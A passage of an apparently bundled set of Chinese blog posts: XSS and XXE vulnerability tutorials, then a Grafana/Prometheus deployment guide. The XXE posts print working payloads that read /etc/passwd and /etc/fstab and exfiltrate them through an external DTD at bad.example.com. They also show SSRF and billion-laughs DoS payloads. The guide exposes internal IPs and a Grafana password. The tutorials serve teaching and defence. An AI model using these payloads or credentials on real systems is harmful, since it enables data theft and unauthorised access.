<font color="#a67f59">\\$safe_name</font> = <font color="#00dd00">htmlspecialchars</font>(<font color="#a67f59">\\$purified_name</font>, <font color="red">ENT_QUOTES</font>);
// Display the safe name
<font color="#00dddd">echo</font> <font color="#00dd00">"\\<strong>Hello, "</font><font color="#a67f59">.\\$name.</font><font color="#00dd00">"!\\</strong>"</font>;
(<font color="#a67f59">...</font>)

### 反射/非持久性跨站点脚本攻击的后果
反射型跨站点脚本被认为比存储型/持久型 XSS 危险性更小，但后果也可能很可怕。 反射 XSS 攻击更难执行，因为它需要的不仅仅是创建和交付单个有效负载。 攻击者还需要使用社会工程技术来针对特定的受害者或受害者群体。

以下是黑帽黑客可以根据前面介绍的简单示例执行的一些操作：

- 他们可以发起网络钓鱼活动，并发送数百万封包含恶意链接的电子邮件，其中的有效负载会将用户重定向到旨在模仿您的 Web 应用程序的网络钓鱼页面。 因此，数百万用户的凭据可能会被盗并归咎于您的 Web 应用程序，这会严重损害您的声誉。
- 他们可以创建一个有效负载，将用户发送到模仿您应用程序登录页面的恶意页面。 然后，他们可以将此恶意 URL 发送给您的内部用户，甚至是您的 CEO。 即使您的一个用户上当受骗，攻击者也将获得他们的凭据以升级攻击。 最终，这可能会让恶意行为者获得对您组织中其他计算机系统的访问权限。`,Vb=`---
title: 存储的/持久的跨站点脚本
date: 2026-04-27
summary: 存储型跨站点脚本是一种跨站点脚本 (XSS)，攻击者首先将负载发送到 Web 应用程序，然后应用程序保存（即存储/持久化）负载（例如，在数据库或服务器中） 侧文本文件），最后，应用程序无意中为每个访问其网页的受害者执行有效负载。 存储型跨站
tags: 漏洞库, Web安全, XSS
cover: app-blue
readingTime: 6 分钟
featured: false
---
# 存储的/持久的跨站点脚本

### 什么是存储/持久跨站点脚本

存储型跨站点脚本是一种跨站点脚本 (XSS)，攻击者首先将负载发送到 Web 应用程序，然后应用程序保存（即存储/持久化）负载（例如，在数据库或服务器中） 侧文本文件），最后，应用程序无意中为每个访问其网页的受害者执行有效负载。 存储型跨站脚本也称为持久型跨站脚本。

### 存储/持久跨站点脚本示例

在此示例中，开发人员希望在他们的其中一个页面 (page.php) 中包含一个简单的评论部分，而无需部署完整的 CMS，例如 WordPress。 它们在 page.php 网页上包含以下表格：

\\<<font color="red">form</font> <font color="#00dd00">action</font>="<font color="#00dddd">/page.php</font>" <font color="#00dd00">method</font>="<font color="#00dddd">post</font>" <font color="#00dd00">id</font>="<font color="#00dddd">comment</font>"\\>
  \\<<font color="red">label</font>  <font color="#00dd00">for</font>="<font color="#00dddd">name</font>">Your name:\\</<font color="red">label</font>>
  \\<<font color="red">input</font> <font color="#00dd00">type</font>="<font color="#00dddd">text</font>" <font color="#00dd00">id</font>="<font color="#00dddd">name</font>" <font color="#00dd00">name</font>="<font color="#00dddd">name</font>">
  \\<<font color="red">label</font> <font color="#00dd00">for "comment"</font>>Your comment:\\</<font color="red">label</font>>
  \\<<font color="red">textarea</font> <font color="#00dd00">type</font>="<font color="#00dddd">comment</font>" <font color="#00dd00">id</font>="<font color="#00dddd">comment</font>" <font color="#00dd00">name</font>="<font color="#00dddd">comment</font>" <font color="#00dd00">rows</font>="<font color="#00dddd">5</font>" <font color="#00dd00">cols</font>="<font color="#00dddd">30</font>"\\>\\</<font color="red">textarea</font>>
  \\<<font color="red">button</font> <font color="#00dd00">type</font>="<font color="#00dddd">submit</font>" <font color="#00dd00">form</font>="<font color="#00dddd">comment</font>" <font color="#00dd00">value</font>="<font color="#00dddd">comment</font>>Add a comment\\</<font color="red">button</font>>
\\</<font color="red">form</font>>

page.php 文件包含以下代码：

// Add a new comment into the database using PDO to avoid SQL injection
(<font color="#a67f59">...</font>)
<font color="#a67f59">\\$name=\\$_POST</font>[<font color="#00dd00">"name"</font>];
<font color="#a67f59">\\$comment=\\$_POST</font>[<font color="#00dd00">"comment"</font>];
<font color="#a67f59">\\$sql =</font> <font color="#00dd00">"INSERT INTO comments (name, comment) VALUES (?,?)"</font>;
<font color="#a67f59">\\$statement = \\$pdo-></font><font color="#00dd00">prepare</font>(<font color="#a67f59">\\$sql</font>);
<font color="#a67f59">\\$statement-></font><font color="#00dd00">execute</font>([<font color="#a67f59">\\$name</font>, <font color="#a67f59">\\$comment</font>]);
(<font color="#a67f59">...</font>)
// Display existing comments
<font color="#a67f59">\\$comments = \\$db-></font><font color="#00dd00">query</font>(<font color="#00dd00">'SELECT * FROM comments'</font>)<font color="#a67f59">-></font><font color="#00dd00">fetchAll</font>();
<font color="#00dddd">foreach</font>(<font color="#a67f59">\\$comments</font> <font color="#00dddd">as</font> <font color="#a67f59">\\$comment</font>) {
    <font color="#00dddd">echo</font> <font color="#00dd00">"\\<tr>\\<td>"</font>.<font color="#a67f59">\\$comment</font>[<font color="#00dd00">'name'</font>]<font color="#a67f59">.</font><font color="#00dd00">"\\</td>"</font>;
    <font color="#00dddd">echo</font> <font color="#00dd00">"\\<td>"</font>.<font color="#a67f59">\\$comment</font>[<font color="#00dd00">'comment'</font>]<font color="#a67f59">.</font><font color="#00dd00">"\\</td>\\</tr>"</font>;
}
(<font color="#a67f59">...</font>)

如您所见，应用程序未经任何验证或清理就将评论插入数据库，随后将其显示在同一页面上供其他用户使用，同样也没有经过验证或清理。

#### 存储型跨站脚本攻击
攻击者在表单中输入以下注释，将名称留空：

\\<script><font color="#00dd00">alert</font>(<font color="#00dd00">"LEAVE THIS PAGE! YOU ARE BEING HACKED!"</font>);\\<\/script>

评论被保存到数据库中。 从现在开始，当任何用户访问该页面时，他们的浏览器都会解释以下代码：

\\<<font color="red">tr</font>>\\<<font color="red">td</font>>\\</<font color="red">td</font>>\\<<font color="red">td</font>>\\<<font color="red">script</font>><font color="#00dd00">alert</font>(<font color="#00dd00">"LEAVE THIS PAGE! YOU ARE BEING HACKED!"</font>);\\</<font color="red">script</font>>\\</<font color="red">td</font>>\\</<font color="red">tr</font>>

浏览器找到一个 <font color="red">\\<script></font> 标签并执行其中的 JavaScript 代码。 结果，它会为用户显示一个弹出窗口，敦促他们离开该页面。

在这个相当无辜的例子中，用户担心他们的安全，将停止访问该页面，直到管理员收到通知并从数据库中删除恶意内容。

<br>

### 修复
获悉该漏洞的开发人员决定使用 HTMLPurifier 过滤来保护代码并转义 HTML 字符。 他们导入 HTMLPurifier 库并按以下方式修改 page.php 文件：

// Add a new comment into the database using PDO to avoid SQL injection
// and HTMLPurifier with HTML escaping to avoid XSS
(<font color="#a67f59">...</font>)
<font color="#a67f59">\\$name=\\$_POST</font>[<font color="#00dd00">"name"</font>];
<font color="#a67f59">\\$comment=\\$_POST</font>[<font color="#00dd00">"comment"</font>];
// Purify user data using HTMLPurifier
(<font color="#a67f59">...</font>)
<font color="#a67f59">\\$purifier</font> = <font color="#00dddd">new HTMLPurifier</font>(<font color="#a67f59">\\$config</font>);
<font color="#a67f59">\\$purified_name = \\$purifier-></font><font color="#00dd00">purify</font>(<font color="#a67f59">\\$name</font>);
<font color="#a67f59">\\$purified_comment = \\$purifier-></font><font color="#00dd00">purify</font>(<font color="#a67f59">\\$comment</font>);
// Just to be sure, HTML-escape special characters
<font color="#a67f59">\\$safe_name</font> = <font color="#00dd00">htmlspecialchars</font>(<font color="#a67f59">\\$purified_name</font>, <font color="red">ENT_QUOTES</font>);
<font color="#a67f59">\\$safe_comment</font> = <font color="#00dd00">htmlspecialchars</font>(<font color="#a67f59">\\$purified_comment</font>, <font color="red">ENT_QUOTES</font>);
// Save safe data in the database
<font color="#a67f59">\\$sql</font> = <font color="#00dd00">"INSERT INTO comments (name, comment) VALUES (?,?)"</font>;
<font color="#a67f59">\\$statement</font> = <font color="#a67f59">\\$pdo-></font><font color="#00dd00">prepare</font>(<font color="#a67f59">$sql</font>);
<font color="#a67f59">\\$statement-></font><font color="#00dd00">execute</font>([<font color="#a67f59">\\$safe_name</font>, <font color="#a67f59">\\$safe_comment</font>]);
(<font color="#a67f59">...</font>)

### 存储/持久跨站点脚本攻击的后果
存储型跨站点脚本是所有 XSS 类型中最危险的，因为它触及的用户数量最多。 这种攻击可能会产生我们在专门介绍跨站点脚本的一般部分中列出的所有后果。

以下是黑帽黑客可以根据前面介绍的简单示例执行的一些操作：

他们可以将用户重定向到模仿原始应用程序的恶意页面并要求他们登录，从而窃取他们的凭据。
他们可以窃取用户的会话 cookie，并使用它们在原始 Web 应用程序中冒充用户。
他们可能会诱骗用户在他们的计算机上下载和安装恶意软件，例如木马、加密货币矿工或勒索软件。
请注意，如果您的 Web 应用程序为内部用户（例如公司员工）提供服务，则成功的攻击可能会让恶意行为者升级并可能获得对您组织中其他计算机系统的访问权限。`,$b=`---
title: XSS
date: 2026-05-01
summary: 跨站点脚本 (XSS) 是一种 Web 漏洞，它允许恶意黑客将不需要的命令引入（注入）到浏览器代表 Web 应用程序执行的合法客户端代码（通常是 JavaScript）中。
tags: 漏洞库, Web安全, XSS
cover: app-teal
readingTime: 6 分钟
featured: false
---
# XSS

### 什么是跨站点脚本
跨站点脚本 (XSS) 是一种 Web 漏洞，它允许恶意黑客将不需要的命令引入（注入）到浏览器代表 Web 应用程序执行的合法客户端代码（通常是 JavaScript）中。

<br>

### 跨站点脚本是如何工作的

大多数网站和 Web 应用程序使用某种动态脚本语言在 Web 浏览器中运行客户端代码。 在绝大多数情况下，这种语言是 JavaScript。 纯 HTML 网站和 Web 应用程序仍然存在，但它们很少见，因为客户端脚本极大地增强了网站或 Web 应用程序的用户界面和功能。 您可以放心地假设，您遇到的 99% 以上的网站和 Web 应用程序都包含客户端 JavaScript 代码。 反过来，这意味着用户浏览器必须能够代表 Web 应用程序解释任何 JavaScript 代码。

大多数 Web 应用程序和网站也以某种方式与用户交互，即使它们不使用 JavaScript。 交互需要某种形式的用户输入。 例如，用户可能需要键入他们的用户名才能登录 Web 应用程序，应用程序稍后可能会在用户界面中显示该用户名。 这意味着应用程序处理用户输入，然后将其输出到 Web 浏览器中。

结合起来，这两个条件为最常见的 Web 安全漏洞——跨站点脚本编写奠定了基础，这是一种注入攻击。 如果攻击者能够在用户输入参数中包含 JavaScript 代码，并且应用程序直接在其 HTML 输出中返回该代码并将其发送到客户端浏览器，则浏览器将执行恶意 JavaScript。 每当网页直接响应用户输入时，攻击者就能够在客户端浏览器中运行恶意脚本，即使该页面本身仅使用静态 HTML 标记构建且不包含 JavaScript。

与大多数其他 Web 应用程序漏洞不同，这个漏洞不会直接影响应用程序的后端（Web 服务器）。 它会影响 Web 应用程序的普通用户或受骗访问它的受害者。 对于某些允许使用 JavaScript 的 API，XSS 也是可能的，例如，API 可能会向用户显示一条错误消息，其中包含攻击者先前注入的 JavaScript。

多年来，跨站点脚本在 OWASP 前 10 名中都有自己单独的类别。但是，在 2021 年，OWASP决定将其与 SQL 注入、RCE 等一起并入注入类别。

<br>

### 跨站点脚本漏洞的类型

有两种非常常见的跨站点脚本技术：

- [反射 XSS（非持久性 XSS）](./XSSType/Reflected_XSS.md)

- [存储型 XSS（持久型 XSS）](./XSSType/Stored_XSS.md)

此外，还有 2 种其他跨站点脚本技术比上述两种技术更少见：

- [基于 DOM 的 XSS]()
- [盲存储型 XSS]()

`,qb=`---
title: OOB XXE
date: 2026-04-26
summary: 带外 XML 外部实体 (OOB XXE) 漏洞是 XXE 漏洞的一种，攻击者不会立即收到对 XXE 负载的响应。 攻击是使用一个通道（例如直接 HTTP 请求）进行的，而结果（例如敏感文件）是通过另一个通道（通常是由攻击者控制的 HTTP
tags: 漏洞库, Web安全, XXE
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# OOB XXE

### 什么是OOB XXE

带外 XML 外部实体 (OOB XXE) 漏洞是 XXE 漏洞的一种，攻击者不会立即收到对 XXE 负载的响应。 攻击是使用一个通道（例如直接 HTTP 请求）进行的，而结果（例如敏感文件）是通过另一个通道（通常是由攻击者控制的 HTTP 服务器）接收的。

由于缺乏直接响应，OOB XXE 有时会与盲 XXE 混淆，但对于盲 XXE，攻击者根本不会收到任何响应，而是根据目标应用程序的行为逐步重建敏感数据， 例如它生成的 Web 服务器和 XML 解析器错误。

利用带外 XXE 漏洞的过程与使用带内 XXE 参数实体类似。 攻击者创建一个外部 DTD（文档类型定义），然后受攻击的应用程序从攻击者控制的 HTTP 服务器下载该 DTD。

虽然带内 XXE 可用于对 Web 应用程序和 API 进行拒绝服务 (DoS) 和服务器端请求伪造 (SSRF) 攻击，但 OOB XXE 的主要目标是敏感数据泄露。

### OOB XXE 举例

以下是一个 PoC 示例，说明攻击者如何使用参数实体通过带外 (OOB) 技术窃取敏感数据：

Request:
\`\`\`
POST http://example.com/xml HTTP/1.1
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM
  "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM
  "http://bad.example.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
\`\`\`

恶意 DTD (bad.example.com/evil.dtd)：

\`\`\`
<!ENTITY % all "<!ENTITY send SYSTEM 'http://bad.example.com/?collect=%file;'>">
%all;
\`\`\`

攻击过程如下：

1. XML 解析器首先解析%file 参数实体，加载文件/etc/passwd。

2. 接下来，XML解析器解析%dtd参数实体，并发出请求以获取攻击者的DTD文件：http://bad.example.com/evil.dtd。

3. 解析器处理完攻击者的 DTD 文件后，%all 参数实体会创建一个名为 &send 的通用实体，其中包含 URL。 此 URL 使用 %file 参数实体，该实体已在步骤 1 中解析，现在保存本地文件的内容。 在本例中，这是 Linux /etc/passwd 文件的内容。

4. 最后，在构造 URL 后，XML 解析器处理 &send XML 实体，从而向攻击者的服务器发送请求。

5. 攻击者可以在自己的一端记录请求并根据日志条目重建文件。

请注意，由于 URL 格式限制，此特定攻击并非旨在将二进制文件发送到攻击者的服务器。 但是，您可以使用 PHP 包装器等技术来使用 Base64 对文件进行编码，从而解决这些限制。
`,Kb=`---
title: XXE
date: 2026-04-25
summary: 如果 Web 应用程序或 API 接受未经净化的 XML 数据，并且其后端 XML 解析器配置为允许外部 XML 实体解析，则会发生 XML 外部实体 (XXE) 漏洞（也称为 XML 外部实体注入或 XXE 注入）。 XXE漏洞可以让恶意
tags: 漏洞库, Web安全, XXE
cover: app-teal
readingTime: 6 分钟
featured: false
---
# XXE

### 什么是XXE漏洞

如果 Web 应用程序或 API 接受未经净化的 XML 数据，并且其后端 XML 解析器配置为允许外部 XML 实体解析，则会发生 XML 外部实体 (XXE) 漏洞（也称为 XML 外部实体注入或 XXE 注入）。 XXE漏洞可以让恶意黑客进行服务器端请求伪造（SSRF）、本地文件包含（LFI）、目录遍历、远程代码执行（RCE）、网络端口扫描和拒绝服务（DoS）等攻击。

### XML 外部实体攻击是如何进行的？
为了使 XXE 攻击成为可能，Web 应用程序或 API 需要满足几个特定要求：

* 它必须接受来自用户的 XML 输入并使用后端 XML 解析器对其进行解析
* XML 解析器必须启用 XML 外部实体支持

要了解导致此安全漏洞的原因，我们需要从一些 XML 基础知识开始。

### Web 应用程序和 API 如何使用 XML

Web 应用程序和 API 通常使用可扩展标记语言 (XML) 相互通信并接受来自用户的结构化数据。 常见用例包括：

* Web 服务和 API：Web 服务和 API 通常使用 XML 在客户端和服务器之间传输数据。 这在使用 SOAP 标准的较旧 Web 服务中尤其常见。
* 内容管理系统：某些内容管理系统 (CMS) 允许用户上传 XML 格式的内容。 例如，可以使用此类导入功能从较旧的 CMS 导入和转换博客文章，或者处理上传的 DOCX 文件或 SVG 图像（两者都是 XML 文档）。
* 电子商务：一些电子商务解决方案使用 XML 与其他系统交换数据。 例如，他们可以使用 XML 文档与库存管理系统或支付网关进行通信。

为了提供此类功能，Web 应用程序或 API 使用后端 XML 解析器 - 通常是用与应用程序相同的语言编写的导入库。 示例包括用于 PHP 的 SimpleXML、用于 Java 的 DocumentBuilder、用于 Python 的 ElementTree、用于 .NET 的 XmlReader 或用于 JavaScript 的 DomParser。

### 什么是 DTD 和 XML 实体

在 XML 解析器可以处理 XML 输入之前，您需要声明有效输入文档的结构。 知道了这一点，解析器就可以确定输入数据是否是预期类型的有效 XML 文档，然后处理其内容。 有两种定义文档类型的格式：更强大、更复杂的 XML 模式定义 (XSD) 和更简单、更旧的文档类型定义 (DTD)。 DTD 有时被认为已经过时（它们源自 SGML，XML 的祖先），但仍然经常使用。

XML 实体是占位符参数，表示不易键入或具有特殊含义的字符。 实体是使用 <!ENTITY> 元素在 DTD 中定义的。 要引用已定义的实体，请使用其名称，前面加一个与号 (&)，后面加一个分号 \`;\`。 您可能熟悉 HTML 中的实体，例如 \`&amp;\` 和 \`&nbsp;\`。

DTD 中 XML 实体的一种用途是将外部内容或引用合并到 DTD 本身中，或者合并到使用 DTD 的文档中。 此类包含内容称为外部 XML 实体 (XXE)。 恶意黑客可能会滥用 XXE 来访问本地文件、本地网络上的 URL 等。

### XXE 攻击的类型
XXE 攻击分为三种基本类型：带内 XXE、带外 XXE 和盲 XXE。

* 在带内 XXE 攻击中，攻击者通过同一通道发送攻击并接收响应，例如通过直接 HTTP 请求和响应。
* 在 带外 XXE 攻击中，易受攻击的系统将攻击结果发送到攻击者控制的资源上。 例如，攻击可以使用直接请求来执行，但会导致被黑客攻击的 Web 服务器将敏感文件发送到攻击者自己的 Web 服务器。
* 在盲 XXE 攻击中，攻击者在攻击后不会收到任何直接响应或结果。 相反，他们观察易受攻击的 Web 应用程序的行为（例如，它生成的错误消息）来确定攻击是否成功，并使用这种间接反馈来逐步窃取信息。

### XXE 攻击示例

XXE 攻击是通过在用户输入中定义恶意 XML 实体来执行的，这些实体将由后端 XML 解析器进行解析。 下面是一个简单（非恶意）XML 外部实体定义的示例：

Request:
\`\`\`
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World">
]>
<foo>
  Hello &bar;
</foo>
\`\`\`

Response:
\`\`\`
HTTP/1.0 200 OK
Hello World
\`\`\`

#### XXE DoS 攻击示例

XML 外部实体定义本身可以包含其他实体定义。 这允许攻击者创建一个递归调用结构，该结构需要很少的输入数据，但可以产生大量输出。 此类输出可能会耗尽 XML 处理器内存，甚至可能导致 Web 服务器过载。 通过使用更多实体扩展以下示例，攻击者可以轻松创建一个如此大的实体，从而耗尽任何尝试处理该实体的 XML 解析器的内存，从而导致拒绝服务。

Request:
\`\`\`
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World ">
  <!ENTITY t1 "&bar;&bar;">
  <!ENTITY t2 "&t1;&t1;&t1;&t1;">
  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<foo>
  Hello &t3;
</foo>
\`\`\`

Response:
\`\`\`
HTTP/1.0 200 OK
Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World
\`\`\`

#### XXE本地数据泄露示例

XXE 定义可能包括 URL 方案，例如实体值中的 file:。 因此，攻击者可以在本地文件系统中包含对可从 Web 服务器访问的文件的引用。 例如，可以是 /etc/passwd 等文件或 Web 应用程序的源代码文件之一。 这种攻击的结果类似于本地文件包含攻击与目录遍历相结合。

Request:
\`\`\`
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "file:///etc/passwd">
]>
<foo>
  &xxe;
</foo>
\`\`\`

Response:
\`\`\`
HTTP/1.0 200 OK
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh 
(...)
\`\`\`

#### 基于 XXE 的 SSRF 示例

XXE 定义还可能包含链接到外部资源的 URL。 由于对 URL 的请求是从 Web 应用程序本身发出的，因为 XML 是在其中解析的，因此这允许服务器端请求伪造。 然后，攻击者可以访问本地网络上的文件，就像位于该网络内部一样，从而绕过防火墙等保护。

Request:

\`\`\`
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "http://192.168.0.1/secret.txt">
]>
<foo>
  &xxe;
</foo>
\`\`\`

Response:
\`\`\`
HTTP/1.0 200 OK
Content of the secret.txt file on the local network (behind the firewall)
\`\`\`

### 将参数实体与 CDATA 一起使用

除了一般实体之外，XML 还支持参数实体。 参数实体仅用于文档类型定义 (DTD)。

参数实体以 % 字符开头。 该字符指示 XML 解析器正在定义参数实体，而不是一般实体。 在下面的非恶意示例中，参数实体用于定义通用实体，然后从 XML 文档中调用该通用实体。

Request:
\`\`\`
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % paramEntity
  "<!ENTITY genEntity 'bar'>">
  %paramEntity;
]>
<data>&genEntity;</data>
\`\`\`

Response:
\`\`\`
HTTP/1.0 200 OK
bar
\`\`\`
<br>
通过组合参数实体和 CDATA 标签，攻击者可以创建托管在 bad.example.com/evil.dtd 上的恶意 DTD：

Request:
\`\`\`
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://bad.example.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
\`\`\`
攻击 DTD文件 (bad.example.com/evil.dtd):
\`\`\`
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents 
'%start;%file;%end;'>">
\`\`\`
当攻击者发送上述 XXE 负载时，XML 解析器将首先尝试通过向 http://bad.example.com/evil.dtd 发出请求来处理 %dtd 参数实体。 下载攻击者的 DTD 后，XML 解析器将加载 %file 参数实体（来自evil.dtd），在本示例中指向 /etc/fstab。 接下来，解析器将文件的内容包装在使用 %start 和 %end 参数实体定义的 CDATA 标记中。 最后，所有内容都存储在另一个名为 %all 的参数实体中。

这个技巧的核心是 %all 实际上定义了一个名为 &fileContents 的通用实体，它可以作为响应的一部分包含在内。 最终结果是包含在 CDATA 标记中的 /etc/fstab 文件的内容。

### 使用 PHP 协议包装器
如果易受 XXE 攻击的 Web 应用程序是 PHP 应用程序，则由于 PHP 协议包装器，新的攻击向量会出现。 PHP 协议包装器是允许访问 PHP 输入和输出流的 I/O 流。

攻击者可以使用 PHP/filter 协议包装器对文件内容进行 Base64 编码。 由于 Base64 始终被视为有效的 XML 数据，因此攻击者可以简单地在服务器上对文件进行编码，然后在接收端对其进行解码。 至关重要的是，这种方法也允许攻击者窃取二进制文件。

Request:
\`\`\`
POST http://example.com/xml.php HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "php://filter/read=convert.base64-encode/resource=/etc/fstab">
]>
<foo>
  &bar;
</foo>
\`\`\`

Response:

\`\`\`
HTTP/1.0 200 OK
IyAvZXRjL2ZzdGFiOiBzdGF0aWMgZmlsZSBzeXN0ZW0gaW5mb3JtYXRpb24uDQojDQojIDxmaWxlIHN5c3RlbT4gPG1vdW50IHBvaW50PiAgIDx0eXBlPiAgPG9wdGlvbnM+ICAgICAgIDxkdW1wPiAgPHBhc3M+DQoNCnByb2MgIC9wcm9jICBwcm9jICBkZWZhdWx0cyAgMCAgMA0KIyAvZGV2L3NkYTUNClVVSUQ9YmUzNWE3MDktYzc4Ny00MTk4LWE5MDMtZDVmZGM4MGFiMmY4ICAvICBleHQzICByZWxhdGltZSxlcnJvcnM9cmVtb3VudC1ybyAgMCAgMQ0KIyAvZGV2L3NkYTYNClVVSUQ9Y2VlMTVlY2EtNWIyZS00OGFkLTk3MzUtZWFlNWFjMTRiYzkwICBub25lICBzd2...
\`\`\`

### XXE 攻击的潜在后果

如果Web应用程序使用的XML解析器支持XML外部实体，攻击者就可以使用上述技术来滥用XXE定义并执行各种攻击，包括：

* 拒绝服务：如果攻击者创建递归包含彼此的 XXE，他们就可以执行称为“十亿笑声攻击”的 DoS 攻击。 此攻击会导致 XML 解析器内存不足，并可能导致 Web 服务器停止响应。 如果 XXE 指向服务器中的大文件或流（例如 Linux 上的 /dev/urandom），也会发生同样的情况。

* 端口扫描：如果攻击者创建尝试连接到本地网络内计算机上的特定端口的 XXE，则主机响应可能允许他们确定该端口是否打开。 通过对多个端口重复此过程，攻击者可以在防火墙后面执行端口扫描。

* 本地文件包含和目录遍历：如果攻击者创建一个指向服务器上本地文件的XXE，他们就可以从本地文件中读取敏感数据，这相当于执行带有路径遍历的LFI。 例如，他们可以读取 Linux 系统上的 /etc/passwd 文件。

* 服务器端请求伪造：如果攻击者创建指向 URL 的 XXE，他们就可以执行 SSRF 攻击。 由于 URL 是由 Web 应用程序本身访问的，因此请求将被视为来自应用程序，而不是用户。 这可能允许攻击者访问受防火墙和白名单保护的系统。

* 远程代码执行（RCE）：在极少数情况下，例如，当使用 PHP/expect 包装器时，可以通过 XXE 执行远程代码。

`,Jb=`---
title: Grafana + Prometheus 实战
date: 2026-05-28
summary: Grafana + Prometheus 实战监控部署指南
tags: Grafana, Prometheus, Linux
cover: app-orange
readingTime: 8 分钟
featured: false
---


# Grafana + Prometheus 实战监控部署指南

## 1. 背景

在日常服务器运维、WAF 测试、大模型推理服务运行过程中，我们需要实时观察：

* CPU 使用率
* 内存占用
* 磁盘 IO
* 网络流量
* GPU 服务器负载
* vLLM 推理服务状态
* Docker 容器资源消耗

为了实现统一监控，我们使用：

* Prometheus 负责采集指标
* Grafana 负责可视化展示

形成一套轻量、稳定、易扩展的监控体系。

---

# 2. 架构说明

整体架构如下：

\`\`\`text
node_exporter --> Prometheus --> Grafana
\`\`\`

其中：

| 组件            | 作用            |
| ------------- | ------------- |
| node_exporter | 采集 Linux 主机指标 |
| Prometheus    | 拉取并存储指标       |
| Grafana       | 展示监控图表        |

---

# 3. 环境信息

## Prometheus

Web 管理界面：

\`\`\`text
http://10.10.121.34:9090
\`\`\`

Prometheus 安装目录：

\`\`\`bash
/home/riversec/prometheus-2.45.0-rc.0.linux-amd64
\`\`\`

---

## Grafana

Web 管理界面：

\`\`\`text
http://10.10.121.34:3000
\`\`\`

默认账号：

\`\`\`text
admin@localhost
\`\`\`

默认密码：

\`\`\`text
Admin123
\`\`\`

Grafana 启动命令：

\`\`\`bash
sudo systemctl start grafana-server
\`\`\`

---

# 4. Prometheus 配置

## 4.1 编辑 Prometheus 配置

登录 Prometheus 宿主机：

\`\`\`bash
ssh riversec@10.10.121.34
\`\`\`

进入目录：

\`\`\`bash
cd /home/riversec/prometheus-2.45.0-rc.0.linux-amd64
\`\`\`

编辑配置文件：

\`\`\`bash
sudo vi prometheus.yml
\`\`\`

添加被监控服务器：

\`\`\`yaml
- job_name: "waf_server"
  static_configs:
    - targets:
      - 10.10.121.37:9100
      - 10.10.121.18:9100
      - 10.10.121.17:9100
      - 10.10.121.15:9100
      - 10.10.121.19:9100
\`\`\`

新增节点时：

\`\`\`yaml
- 10.10.121.20:9100
\`\`\`

即可。

---

# 5. 重载 Prometheus 配置

查看 Prometheus 进程：

\`\`\`bash
ps aux | grep prometheus
\`\`\`

找到 PID 后：

\`\`\`bash
kill -HUP <PID>
\`\`\`

Prometheus 会重新加载配置。

如果服务未启动：

\`\`\`bash
nohup ./prometheus > node.log 2>&1 &
\`\`\`

---

# 6. 部署 node_exporter

登录被监控服务器：

\`\`\`bash
ssh root@10.10.121.20
\`\`\`

下载 exporter：

\`\`\`bash
wget http://10.10.8.250/temp/Safeplus/prometheus/node_exporter-1.6.0.linux-amd64.tar.gz
\`\`\`

解压：

\`\`\`bash
tar -zxvf node_exporter-1.6.0.linux-amd64.tar.gz
\`\`\`

进入目录：

\`\`\`bash
cd node_exporter-1.6.0.linux-amd64
\`\`\`

启动 exporter：

\`\`\`bash
nohup ./node_exporter > node.log 2>&1 &
\`\`\`

默认监听端口：

\`\`\`text
9100
\`\`\`

---

# 7. 验证监控状态

打开：

\`\`\`text
http://10.10.121.34:9090/targets
\`\`\`

查看：

\`\`\`text
State = UP
\`\`\`

说明采集成功。

如果状态为 DOWN：

需要检查：

* 9100 端口是否开放
* 防火墙
* exporter 是否启动
* 网络连通性

---

# 8. Grafana 可视化

Grafana：

\`\`\`text
http://10.10.121.34:3000
\`\`\`

登录后：

## 添加数据源

选择：

\`\`\`text
Prometheus
\`\`\`

数据源地址：

\`\`\`text
http://10.10.121.34:9090
\`\`\`

保存即可。

---

# 9. 推荐监控面板

推荐导入：

## Node Exporter Full

Grafana Dashboard ID：

\`\`\`text
1860
\`\`\`

包含：

* CPU
* Load
* Memory
* Disk
* Network
* Filesystem
* TCP

等完整监控。

---

# 10. GPU / AI 服务监控建议

对于：

* vLLM
* GPU 推理
* embedding 服务

建议额外监控：

## GPU 指标

例如：

* GPU Utilization
* VRAM
* 温度
* 功耗

国产 GPU 环境：

可以结合：

\`\`\`bash
hy-smi
\`\`\`

或者：

\`\`\`bash
rocm-smi
\`\`\`

进行指标采集。

---


# 11. 告警建议

Prometheus 可结合 Alertmanager：

实现：

* CPU 高负载告警
* 内存不足
* GPU OOM
* 服务 DOWN
* 磁盘满

并推送：

* Slack
* 企业微信
* 飞书
* 邮件

---

# 12. 实际应用场景

目前该监控体系已用于：

* WAF 服务监控
* GPU 推理集群
* vLLM 服务
* embedding 模型
* Docker 容器
* OpenResty 网关
* AI 安全平台

能够快速发现：

* 服务异常
* GPU 负载过高
* 内存泄漏
* 网络异常
